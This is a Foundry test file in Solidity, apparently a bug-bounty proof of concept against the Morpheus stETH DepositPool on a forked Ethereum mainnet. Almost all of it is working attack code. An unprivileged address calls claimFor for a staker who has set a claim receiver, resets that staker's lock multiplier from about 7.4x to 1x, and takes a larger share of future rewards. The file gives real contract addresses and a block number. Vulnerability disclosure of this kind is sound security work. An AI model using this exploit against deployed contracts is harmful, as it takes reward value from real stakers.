// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function lockClaim(uint256 rewardPoolIndex_, uint128 claimLockEnd_) external;
    function setClaimReceiver(uint256 rewardPoolIndex_, address receiver_) external;
    function claimReceiver(uint256, address) external view returns (address);
    function claimSender(uint256, address, address) external view returns (bool);
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function distributedRewards(uint256, address) external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IPriceConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

/// @title DepositPool claimFor receiver bypass — Morpheus bug bounty PoC
/// @notice Fork PoC pinned to Ethereum block 26434871.
///         Target: stETH DepositPool 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790
///         (Ethereum, Appendix A). Run: forge test
/// @notice The attack: claimFor skips the claimSender check entirely when a
///         claimReceiver is set, so ANY address can force-claim for that staker;
///         _claim unconditionally resets the lock, destroying the victim's lock
///         multiplier (here ~7.4x -> 1x) and capturing a share of their future
///         emissions. No privileged accounts are used.
/// @notice Harness note: Chainlink reads are mocked to their pinned-block values
///         (warps would stale them); the attack does not depend on oracle behaviour.
///         One day of Lido rebase yield is simulated per tranche as a small stETH
///         donation to the Distributor, exactly as mainnet produces it.
contract DepositPoolHunter03Test is Test {
    uint256 constant FORK_BLOCK = 26434871;
    address constant POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790; // stETH DepositPool
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A; // Distributor
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    IDepositPool pool = IDepositPool(POOL);
    IDistributor dist = IDistributor(DIST);
    IStETH steth = IStETH(STETH);

    bytes32[] pathIds;
    uint256[] prices;

    function _capturePrices() internal {
        address consumer_ = dist.chainLinkDataConsumer();
        address[5] memory pools_ = [
            0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790,
            0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384,
            0xdE283F8309Fd1AA46c95d299f6B8310716277A42,
            0x6cCE082851Add4c535352f596662521B4De4750E,
            0x3B51989212BEdaB926794D6bf8e9E991218cf116
        ];
        for (uint256 i = 0; i < pools_.length; i++) {
            (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, pools_[i]);
            if (!isExist_) continue;
            bytes32 pid_ = IPriceConsumer(consumer_).getPathId(path_);
            uint256 px_ = IPriceConsumer(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
            require(px_ > 0, "price capture failed");
            pathIds.push(pid_);
            prices.push(px_);
        }
    }

    function _mockPrices() internal {
        address consumer_ = dist.chainLinkDataConsumer();
        for (uint256 i = 0; i < pathIds.length; i++) {
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(IPriceConsumer.getChainLinkDataFeedLatestAnswer.selector, pathIds[i]),
                abi.encode(prices[i])
            );
        }
    }

    function _stakeSteth(address who_, uint256 ethAmount_, uint128 lockEnd_, address referrer_)
        internal
        returns (uint256 virtual_)
    {
        vm.deal(who_, ethAmount_ + 1 ether);
        vm.startPrank(who_);
        steth.submit{value: ethAmount_}(address(0));
        uint256 bal_ = steth.balanceOf(who_);
        steth.approve(POOL, type(uint256).max);
        steth.approve(DIST, type(uint256).max);
        pool.stake(0, bal_, lockEnd_, referrer_);
        vm.stopPrank();
        (,,,,,, virtual_,,) = pool.usersData(who_, 0);
    }

    function _donateYield(uint256 ethAmount_) internal {
        address donor_ = makeAddr("yieldDonor");
        vm.deal(donor_, ethAmount_);
        vm.prank(donor_);
        steth.submit{value: ethAmount_}(address(0));
        uint256 bal_ = steth.balanceOf(donor_);
        vm.prank(donor_);
        steth.transfer(DIST, bal_ - 1000); // leave dust: exact-balance transfer can exceed share coverage by a few wei
    }

    function _totalVirtual() internal view returns (uint256) {
        (,, uint256 t_) = pool.rewardPoolsData(0);
        return t_;
    }

    /// @notice F1: an unprivileged caller can force-claim any staker who set a
    /// claimReceiver, resetting that staker's lock multiplier (here ~7.4x -> 1x)
    /// and capturing a share of their future emissions.
    function test_ForcedClaimViaReceiverResetsMultiplier() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
        vm.deal(address(this), 10 ether); // pays the {value} on pranked claim calls
        _capturePrices();
        _mockPrices(); // pin Chainlink reads to fork-block values (warps would stale them)

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        address receiver = makeAddr("receiver");

        // Victim stakes 1000 stETH with a 5-year claim lock (~7.4x tanh
        // multiplier) and sets a claim receiver (e.g. their L2 address).
        uint128 lockEnd = uint128(block.timestamp + 5 * 365 days);
        uint256 victimVirtual = _stakeSteth(victim, 1000 ether, lockEnd, address(0));
        vm.prank(victim);
        pool.setClaimReceiver(0, receiver);
        assertEq(pool.claimReceiver(0, victim), receiver, "receiver must be set");

        // Attacker stakes 100 stETH, no lock (1x).
        uint256 attackerVirtual = _stakeSteth(attacker, 100 ether, 0, address(0));

        (, uint256 vDep,,, uint128 vLockStart, uint128 vLockEnd, uint256 vVirt,,) = pool.usersData(victim, 0);
        console.log("victim virtual:", vVirt);
        console.log("victim deposited:", vDep);
        console.log("attacker virtual:", attackerVirtual);
        assertGt(vVirt, 7 * vDep, "victim multiplier must exceed 7x");
        assertLt(vVirt, (75 * vDep) / 10, "victim multiplier must be below 7.5x");
        assertEq(vLockEnd, lockEnd, "lock end must match");
        assertEq(vLockStart, uint128(block.timestamp), "lock start is stake time");
        assertApproxEqAbs(attackerVirtual, 100 ether, 1e9, "attacker virtual is 1x (rounding dust aside)");

        // The attacker was NEVER delegated: no claimSender grant exists.
        assertFalse(pool.claimSender(0, victim, attacker), "attacker must not be a claimSender");

        // Tranche 2: simulate one day of Lido rebase yield (~0.3 stETH) so the
        // next distribution allocates to the stETH pool, warp past the gate.
        _donateYield(0.3 ether);
        vm.warp(block.timestamp + 1 days + 1);
        _mockPrices();
        uint256 pushedBefore = dist.distributedRewards(0, POOL);
        dist.distributeRewards(0);
        uint256 tranche2 = dist.distributedRewards(0, POOL) - pushedBefore;
        console.log("tranche2 (MOR wei):", tranche2);
        assertGt(tranche2, 0, "a real tranche must land");

        uint256 victimPending2 = pool.getLatestUserReward(0, victim);
        uint256 attackerPending2 = pool.getLatestUserReward(0, attacker);
        uint256 totalVBefore = _totalVirtual();
        console.log("victim pending after tranche2:", victimPending2);
        console.log("attacker pending after tranche2:", attackerPending2);
        console.log("totalVirtual before attack:", totalVBefore);
        assertGt(victimPending2, 0, "victim must have accrued");
        assertGt(attackerPending2, 0, "attacker must have accrued");
        // Victim share of tranche2 ~= victimVirtual / totalVirtual.
        uint256 victimShare2 = (victimPending2 * 1e18) / tranche2;
        uint256 expectShare2 = (victimVirtual * 1e18) / totalVBefore;
        assertApproxEqRel(victimShare2, expectShare2, 0.01e18, "victim share must match virtual weight");
        uint256 attackerShare2 = (attackerPending2 * 1e18) / tranche2;
        console.log("victim share of tranche2 (1e18):", victimShare2);
        console.log("attacker share of tranche2 (1e18):", attackerShare2);

        // Warp past the victim's claim lock (and both 14-day claim locks).
        vm.warp(uint256(lockEnd) + 1);

        // ATTACK: a stranger (no delegation) force-claims the victim. The
        // claimReceiver override bypasses the claimSender check entirely
        // (DepositPool.claimFor L285-290). Rewards go to the victim's
        // receiver, but the victim's lock multiplier is destroyed.
        uint256 attackerEthBefore = attacker.balance;
        vm.prank(attacker);
        pool.claimFor{value: 0.05 ether}(0, victim, attacker);
        console.log("attacker ETH spent (LZ fee net of refund):", attackerEthBefore - attacker.balance);

        (, uint256 vDepAfter,,, uint128 vLockStartAfter, uint128 vLockEndAfter, uint256 vVirtAfter,,) =
            pool.usersData(victim, 0);
        uint256 totalVAfter = _totalVirtual();
        console.log("victim virtual after forced claim:", vVirtAfter);
        console.log("victim deposited after forced claim:", vDepAfter);
        console.log("totalVirtual after attack:", totalVAfter);
        assertEq(vLockStartAfter, 0, "claim lock start must be reset");
        assertEq(vLockEndAfter, 0, "claim lock end must be reset");
        assertEq(vDepAfter, vDep, "victim deposit must be untouched");
        assertEq(vVirtAfter, vDepAfter, "victim virtual must collapse to 1x");
        assertEq(pool.getLatestUserReward(0, victim), 0, "victim pending must be paid out");
        assertEq(totalVBefore - totalVAfter, victimVirtual - vDepAfter, "total must drop by the lost multiplier");

        // Tranche 3 (post-attack): another simulated day of yield + gate warp.
        // NOTE: this tranche covers ~5 years of emissions (lastCalc was only
        // updated at tranche 2), so only SHARES are compared, never absolute
        // amounts across tranches.
        _donateYield(0.3 ether);
        vm.warp(block.timestamp + 1 days + 1);
        _mockPrices();
        pushedBefore = dist.distributedRewards(0, POOL);
        dist.distributeRewards(0);
        uint256 tranche3 = dist.distributedRewards(0, POOL) - pushedBefore;
        assertGt(tranche3, 0, "tranche3 must land");
        uint256 victimPending3 = pool.getLatestUserReward(0, victim);
        uint256 attackerPending3 = pool.getLatestUserReward(0, attacker);
        uint256 victimShare3 = (victimPending3 * 1e18) / tranche3;
        // Attacker pending3 includes tranche2 accrual; isolate tranche3 only.
        uint256 attackerShare3 = ((attackerPending3 - attackerPending2) * 1e18) / tranche3;
        console.log("victim share of tranche3 (1e18):", victimShare3);
        console.log("attacker share of tranche3 (1e18):", attackerShare3);
        console.log("victim share before (1e18):", victimShare2);
        assertLt(victimShare3, victimShare2 / 3, "victim share must collapse to <1/3 of before");
        assertGt(attackerShare3, attackerShare2, "attacker share must rise");

        // Dailyised victim loss: (shareBefore - shareAfter) * 1-day tranche.
        uint256 dailyLossMor = ((victimShare2 - victimShare3) * tranche2) / 1e18;
        console.log("victim loss per day of inactivity (MOR wei):", dailyLossMor);
        assertGt(dailyLossMor, 0, "daily loss must be positive");

        // Permanent component: even an immediate re-lock from the new (later)
        // start can never recover the original multiplier.
        vm.prank(victim);
        pool.lockClaim(0, uint128(block.timestamp + 5 * 365 days));
        (,,,,,, uint256 vVirtRelocked,,) = pool.usersData(victim, 0);
        console.log("victim virtual after immediate re-lock:", vVirtRelocked);
        assertLt(vVirtRelocked, victimVirtual, "re-lock must not recover the old multiplier");
    }
}
